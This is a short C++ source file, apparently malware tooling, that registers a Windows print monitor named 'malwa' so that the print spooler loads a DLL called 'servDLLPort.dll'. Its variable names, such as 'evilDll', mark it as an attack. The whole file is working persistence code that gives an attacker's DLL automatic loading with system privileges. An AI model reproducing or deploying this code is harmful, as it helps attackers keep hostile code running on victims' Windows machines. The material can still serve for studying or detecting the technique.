// x86_64-w64-mingw32-g++ monitor.cpp -o monitor.exe -lwinspool

#include "Windows.h"
#include <cstdio>


int main() {
	HKEY hKey;
	LPCSTR path = "System\\CurrentControlSet\\Control\\Print\\Monitors\\malwa";
	LPCSTR evilDll = "servDLLPort.dll";

    MONITOR_INFO_2 monitorInfo;
    TCHAR env[12] = TEXT("Windows x64");
    TCHAR name[6] = TEXT("malwa");
    TCHAR dll[16] = TEXT("servDLLPort.dll");
    monitorInfo.pName = name;
    monitorInfo.pEnvironment = env;
    monitorInfo.pDLLName = dll;

    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);

    return 0;
}